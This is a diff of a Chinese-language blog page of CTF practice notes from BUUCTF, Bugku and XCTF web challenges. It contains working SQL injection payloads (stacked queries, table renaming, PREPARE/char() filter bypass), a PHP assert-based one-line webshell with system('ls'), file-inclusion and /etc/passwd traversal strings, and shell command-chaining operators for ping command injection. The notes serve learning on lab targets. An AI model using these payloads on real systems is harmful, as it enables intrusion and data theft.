@@ -16,19 +16,19 @@
   <meta name="author" content="7bmk">
   <meta name="keywords" content="">
   
-    <meta name="description" content="web[极客大挑战 2019]EasySQL考察最简单的万能密码: 1&#x2F;?name&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;1&amp;#x27;&amp;password&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1 [强网杯 2019]随便注考察了堆叠注入，以及你8会的一些sql语法 目录穿越用途: 已知文件名，想查看这个文件(该文件不在当前相对路径的文件夹下)eg:ht">
+    <meta name="description" content="刷题记录，未来会总结成笔记 web[极客大挑战 2019]EasySQL考察最简单的万能密码: 1&#x2F;?name&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;1&amp;#x27;&amp;password&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1 [强网杯 2019]随便注简单的有回显注入考察了堆叠注入，以及你8会的一些sql语法 然后禁止了一些关键词如select等，然后可">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buuctf\bugku\xctf">
 <meta property="og:url" content="http://example.com/2021/11/27/buuctf/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="web[极客大挑战 2019]EasySQL考察最简单的万能密码: 1&#x2F;?name&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;1&amp;#x27;&amp;password&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1 [强网杯 2019]随便注考察了堆叠注入，以及你8会的一些sql语法 目录穿越用途: 已知文件名，想查看这个文件(该文件不在当前相对路径的文件夹下)eg:ht">
+<meta property="og:description" content="刷题记录，未来会总结成笔记 web[极客大挑战 2019]EasySQL考察最简单的万能密码: 1&#x2F;?name&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;1&amp;#x27;&amp;password&#x3D;1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1 [强网杯 2019]随便注简单的有回显注入考察了堆叠注入，以及你8会的一些sql语法 然后禁止了一些关键词如select等，然后可">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8Binput.png">
 <meta property="og:image" content="http://example.com/images/%E5%88%B7%E9%A2%98/xctf(2).png">
 <meta property="og:image" content="http://example.com/images/%E5%88%B7%E9%A2%98/xctf(!).png">
 <meta property="og:image" content="http://example.com/images/%E5%88%B7%E9%A2%98/bugku(1).png">
 <meta property="article:published_time" content="2021-11-27T05:45:27.000Z">
-<meta property="article:modified_time" content="2022-01-19T07:47:03.617Z">
+<meta property="article:modified_time" content="2022-03-05T10:04:32.937Z">
 <meta property="article:author" content="7bmk">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="pwn">
@@ -215,7 +215,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3k 字
+      6.7k 字
     </span>
   
 
@@ -224,7 +224,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      25 分钟
+      56 分钟
     </span>
   
 
@@ -256,26 +256,48 @@
             <h1 style="display: none">buuctf\bugku\xctf</h1>
             
             <div class="markdown-body">
-              <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>考察最简单的万能密码:</p>
+              <p>刷题记录，未来会总结成笔记</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>考察最简单的万能密码:</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs pgsql">/?<span class="hljs-type">name</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=1&#x27;</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>考察了堆叠注入，以及你8会的一些sql语法</p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>简单的有回显注入<br>考察了堆叠注入，以及你8会的一些sql语法</p>
+<p>然后禁止了一些关键词如select等，然后可以通过一些方法猜出数据库长度、名称<br>eg: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>)<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+<p>然而事实上要更简单: </p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<p>可以得到2个表: words和1919810931114514</p>
+<p>查看words表:</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; show `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<p>注意此处words为反勾号(事实上不加也可以)，关于勾号和反勾号再科普一下</p>
+<p>然后获得columns: id、data<br>再查看1919810931114514的columns(注意此处就需要加反勾号了): flag<br>然后就要想办法获取flag字段了</p>
+<h3 id="姿势1-重命名"><a href="#姿势1-重命名" class="headerlink" title="姿势1-重命名"></a>姿势1-重命名</h3><p>未过滤alert、rename，可以进行表、列的修改<br>“因为这里有两张表，回显内容肯定是从word这张表中回显的”<br>那就把1919810931114514改名为words，再把flag改名为id，就阔以查询了<br>payload:</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">;RENAME TABLE `words` TO `words1`;  </span><br>RENAME TABLE `1919810931114514` TO `words`;<br>ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(<span class="hljs-number">100</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="hljs-literal">NOT</span> NULL<span class="hljs-comment">;</span><br><span class="hljs-title"># character: 字符集, 这段话的意思是:</span> 修改表的字段的字符集<br>show columns from words<span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure>
+<p>此处第3个语句对column进行改名，如果使用普通的改名语句是8行的比如:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `table_name` rename <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;name1&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;name2&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>涉及到对字符编码的修改，至于为啥要用utf-8，我也很迷….(那自然是因为用的普遍了)<br>但不修改为啥不行呢? 这是真的8懂</p>
+<p>最后用 1’ or ‘1’&#x3D;’1 就阔以查询得flag了</p>
+<h4 id="修改column的字符集"><a href="#修改column的字符集" class="headerlink" title="修改column的字符集"></a>修改column的字符集</h4><p>eg: 修改表的字段的字符集<br>[字符集 utf8，排序规则 utf8_general_ci]   (collate: 整理)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> CHANGE name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci;<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="姿势2-预处理语句-char-concat-绕过关键字屏蔽"><a href="#姿势2-预处理语句-char-concat-绕过关键字屏蔽" class="headerlink" title="姿势2-预处理语句 + char() + concat()绕过关键字屏蔽"></a>姿势2-预处理语句 + char() + concat()绕过关键字屏蔽</h3><p>首先扫盲，啥是预处理</p>
+<h4 id="预处理语句使用方式"><a href="#预处理语句使用方式" class="headerlink" title="预处理语句使用方式"></a>预处理语句使用方式</h4><p>所谓预编译语句就是将SQL语句中的值(表名、列名等)用占位符替代，可以视为将 SQL 语句模板化或者说参数化</p>
+<p>定义预处理语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> stmt_name <span class="hljs-keyword">FROM</span> preparable_stmt;<br></code></pre></td></tr></table></figure>
+<p>执行预处理语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXECUTE</span> stmt_name [<span class="hljs-keyword">USING</span> <span class="hljs-variable">@var</span>_name [, <span class="hljs-variable">@var</span>_name] ...];  <span class="hljs-comment">-- execute: 执行</span><br></code></pre></td></tr></table></figure>
+<p>删除(释放)定义</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DEALLOCATE</span><span class="hljs-operator">|</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">PREPARE</span> stmt_name;  <span class="hljs-comment">-- deallocate: 解除分配</span><br></code></pre></td></tr></table></figure>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;PREPARE jwt from concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), &#x27; * from `<span class="hljs-number">1919810931114514</span>` &#x27;);EXECUTE jwt;#<br></code></pre></td></tr></table></figure>
+
+<p>卧槽…..这操作…..</p>
+<h3 id="关于勾号和反勾号"><a href="#关于勾号和反勾号" class="headerlink" title="关于勾号和反勾号"></a>关于勾号和反勾号</h3><p>linux下不区分，win下区分<br>勾号用来包含字符串，反勾号用来包含表、数据库、索引等</p>
 <h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>用途: 已知文件名，想查看这个文件(该文件不在当前相对路径的文件夹下)<br>eg:<br><a target="_blank" rel="noopener" href="https://www.*****.com/loadImage?filename=../../../etc/passwd">https://www.*****.com/loadImage?filename=../../../etc/passwd</a><br>filename的参数值与真实路径组合起来就是：<br>&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>其等价于：<br>&#x2F;etc&#x2F;passwd</p>
 <p>..&#x2F;：上一级目录；.&#x2F;：当前目录；&#x2F;：根目录</p>
 <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>一个php文件，一般访问时阔能只能看到其执行后的效果，而没法看到其文本，文件包含阔以以base64流的形式让我们获取这个文本<br>eg: </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></table></figure>
 <h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>通俗地说，当满足get传参时，阔以试试把参数(shit)设置为”?shit&#x3D;php:&#x2F;&#x2F;input”, 然后在hackbar里的post传入内容(通常是代码payload), 然后服务器就会执行这个payload</p>
 <p>eg:<br><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8Binput.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><h2 id="xctf-命令执行-考察win、linux下的命令"><a href="#xctf-命令执行-考察win、linux下的命令" class="headerlink" title="xctf-命令执行-考察win、linux下的命令"></a>xctf-命令执行-考察win、linux下的命令</h2><p>进去后是个页面，可以输入网址，然后人家会帮你ping这个网址</p>
-<p>所以你要了解的:</p>
-<h3 id="win和linux下的命令"><a href="#win和linux下的命令" class="headerlink" title="win和linux下的命令"></a>win和linux下的命令</h3><div class="code-wrapper"><pre><code class="hljs">||、|、&amp;&amp;、&amp;
-在win或linux下，
-||: [command1]||[command2]表示先执行command1, 若command1为假，则执行command2;
-&amp;&amp;: 先执行command1, 若为真，则执行command2
-|: 表示只执行command2(所以这个玩意有卵用?直接别写command18就行了?)
-&amp;: 先执行command1再执行command2
-</code></pre></div>
-<p>然后用目录穿越找flag，boom</p>
-<h2 id="bugku-bp-爆密码有时结合源码，8一定length"><a href="#bugku-bp-爆密码有时结合源码，8一定length" class="headerlink" title="bugku-bp (爆密码有时结合源码，8一定length)"></a>bugku-bp (爆密码有时结合源码，8一定length)</h2><p>一开始以为是简单的爆密码，然后发现爆不出来，返回的长度都一样</p>
+<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><h2 id="bugku-bp-爆密码有时结合源码，8一定length"><a href="#bugku-bp-爆密码有时结合源码，8一定length" class="headerlink" title="bugku-bp (爆密码有时结合源码，8一定length)"></a>bugku-bp (爆密码有时结合源码，8一定length)</h2><p>一开始以为是简单的爆密码，然后发现爆不出来，返回的长度都一样</p>
 <p>然后看wp，明白了有可能是无论密码正确或错误，它返回响应的长度都是一样的<br>那么就可能是根据js代码来回显信息的，然后查看返回包返回的js代码，果然有问题，返回wrong password的代码里</p>
 <p>这里就要通过bugku的Grep_Match来过滤掉js代码里存在{code: ‘bugku10000’}的包:<br>intruder-&gt;options-&gt;Grep_Match-&gt;add-&gt;{code: ‘bugku10000’}</p>
 <h2 id="xctf-php2"><a href="#xctf-php2" class="headerlink" title="xctf php2"></a>xctf php2</h2><p>tips: 某些情况用户可通过.phps后缀查看php源码</p>
@@ -292,7 +314,24 @@
 <h3 id="ThinkPHP路由"><a href="#ThinkPHP路由" class="headerlink" title="ThinkPHP路由"></a>ThinkPHP路由</h3><p>以俺的理解，路由就是把url翻译为你想执行的操作方法</p>
 <h3 id="payload-抄"><a href="#payload-抄" class="headerlink" title="payload(抄)"></a>payload(抄)</h3><p>没学过php，啥也看不懂，枯辽</p>
 <p>漏洞分析：<br>这个版本的路由默认使用的是混合模式没有强制开启路由，导致攻击者可以构造特定请求(URL)获取webshell</p>
-<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="bugku-overflow-萌新第一道pwn题"><a href="#bugku-overflow-萌新第一道pwn题" class="headerlink" title="bugku overflow, 萌新第一道pwn题"></a>bugku overflow, 萌新第一道pwn题</h2><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>下载附件<br>首先kali里打开， file [file]查看文件属性，checksec [file]查看开启了哪些保护<br>哦原来我还没装checksec啊，那没事了</p>
+<h2 id="bugku-shell"><a href="#bugku-shell" class="headerlink" title="bugku shell"></a>bugku shell</h2><p>打开后发现是空白页面，根据提示:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$poc</span>=<span class="hljs-string">&quot;a#s#s#e#r#t&quot;</span>;<br><span class="hljs-variable">$poc_1</span>=explode(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$poc</span>);   <span class="hljs-comment">//把字符打散为数组</span><br><span class="hljs-variable">$poc_2</span>=<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">4</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">//asset</span><br><span class="hljs-variable">$poc_2</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-comment">//asset($_GET[&#x27;s&#x27;]); asset():判断1个表达式是否成立，返回True和False(重点在于:里面的表达式会被执行)</span><br></code></pre></td></tr></table></figure>
+<p>于是输入&#x2F;?s&#x3D;system(‘ls’)<br>返回: flaga15808abee46a1d5.txt index.php </p>
+<p>所以这题讲了个啥？ 好像是科普了一个一句话木马<br>科普: assert是能执行shell命令的危险函数之一</p>
+<h2 id="bugku-game1"><a href="#bugku-game1" class="headerlink" title="bugku game1"></a>bugku game1</h2><p>盖大楼小游戏，需要分数达到一定程度</p>
+<p>抓包没用，试试控制台<br>也没用<br>f12检查net发现，结束游戏后会向其他网站发送数据:<br><a target="_blank" rel="noopener" href="http://114.67.175.224:18173/score.php?score=75&amp;ip=223.104.204.24&amp;sign=zMNzU===">http://114.67.175.224:18173/score.php?score=75&amp;ip=223.104.204.24&amp;sign=zMNzU%3D%3D%3D</a><br>多试几次<br><a target="_blank" rel="noopener" href="http://114.67.175.224:18173/score.php?score=50&amp;ip=223.104.204.24&amp;sign=zMNTA===">http://114.67.175.224:18173/score.php?score=50&amp;ip=223.104.204.24&amp;sign=zMNTA%3D%3D%3D</a><br>观察到sign是zM+base64编码分数+’&#x3D;&#x3D;’的形式<br>于是就开始刷，但是太高了发现还是没用，这是因为有上限阈值，所以要写脚本一个一个试</p>
+<h2 id="include-ACTF2020"><a href="#include-ACTF2020" class="headerlink" title="include ACTF2020"></a>include ACTF2020</h2><p>进入页面发现只有一个按钮，点击后发现是这样传播: <a target="_blank" rel="noopener" href="http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php">http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php</a></p>
+<p>于是联想到文件包含漏洞，构造: &#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>有回显，base64转码得index.php源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">&quot;utf8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;php://input&quot;</span>) || stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;zip://&quot;</span>) || stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;phar://&quot;</span>) || stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data:&quot;</span>))&#123;<br>	<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);  <span class="hljs-comment">// stristr: 返回查找的字符串+后面剩余字符串，总之就是检测</span><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>)&#123;<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;  <span class="hljs-comment">//flag.php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>再试试同样的方法查看flag.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;f6ca3992-6f08-4c09-b7e9-9d70e8c1d702&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="ping-ping-ping-GXYCTF-命令联合执行"><a href="#ping-ping-ping-GXYCTF-命令联合执行" class="headerlink" title="ping_ping_ping GXYCTF  命令联合执行"></a>ping_ping_ping GXYCTF  命令联合执行</h2><p>进入后是一个ping网址，这类题见了8下3次了，属于命令执行漏洞(或sql注入)，需要对linux指令有一定了解</p>
+<p>输入127.0.0.1，ping成功了，说明有命令执行漏洞(为什么呢? 某个wp说的，俺也8清楚….)</p>
+<p>然后因为贫瘠的linux知识，于是先试试sql注入吧</p>
+<p>闭合失败…..太难了</p>
+<p>那就是命令执行漏洞了</p>
+<h2 id="小总结-命令执行漏洞总结以及linux常用指令"><a href="#小总结-命令执行漏洞总结以及linux常用指令" class="headerlink" title="小总结: 命令执行漏洞总结以及linux常用指令"></a>小总结: 命令执行漏洞总结以及linux常用指令</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在win或linux下，<br>||: [command1]||[command2]表示先执行command1, 若command1为假，则执行command2;<br>&amp;&amp;: 先执行command1, 若为真，则执行command2<br>|: 表示只执行command2(所以这个玩意有卵用?直接别写command18就行了?)<br>&amp;: 先执行command1再执行command2<br>;: 前面的执行完执行后面的<br>ls &#x2F;(注意空格): 列出根目录下的所有文件<br>pwd: (print work directory), 用于立刻显示当前所在目录</p>
+<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="bugku-overflow-萌新第一道pwn题"><a href="#bugku-overflow-萌新第一道pwn题" class="headerlink" title="bugku overflow, 萌新第一道pwn题"></a>bugku overflow, 萌新第一道pwn题</h2><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>下载附件<br>首先kali里打开， file [file]查看文件属性，checksec [file]查看开启了哪些保护<br>哦原来我还没装checksec啊，那没事了</p>
 <p>啊艹了，安了半天，8过还是安好了<del>好像上次(n个月前)就卡在了这步，当时卡了一天，后来就放弃了(由此可见懂点操作系统是多么重要)</del></p>
 <p>啊艹了，在linux里执行不了是怎么回事</p>
 <p>然后问大佬，大佬让俺先 ls -l [file] #(列出当前文件夹下所有文件的属性), 然后 chmod 777 [file] #(计算机常用命令，改变文件权限为可读可写可执行)，就修好了</p>
@@ -307,7 +346,9 @@
 <p>然后！关键的一步来了，解压缩，然后打开这个文件，发现里面居然有。。。。。。</p>
 <p>居然有。。。。</p>
 <p>居然求也没有，没用的知识又增加了</p>
-<p>最后比赛结束看wp，可见misc快速学习上手某件事物的能力是很重要的….（documental.xml下寻找-&lt;w:t&gt;的标签）</p>
+<p>最后比赛结束看wp，可见misc快速学习上手某件事物的能力是很重要的….（documental.xml下寻找-&lt;w:t&gt;的标签）(实际上是没学过xml的锅)</p>
+<h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;— —– —.&lt; +++++ ++[-&gt; +++++ ++&lt;]&gt; +++.&lt; +++++ +[-&gt;- —– &lt;]&gt;– —– -.–. —-. –.++ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +.++. &lt;++++ ++[-&gt; —– -&lt;]&gt;- —– —-. -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;+. —-. ++++. &lt;++++ +++[- &gt;—- —&lt;] &gt;—- .+.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</p>
+<p>由上述符号组成的字符串为brainfuck加密，混个眼熟</p>
 
             </div>
             <hr>
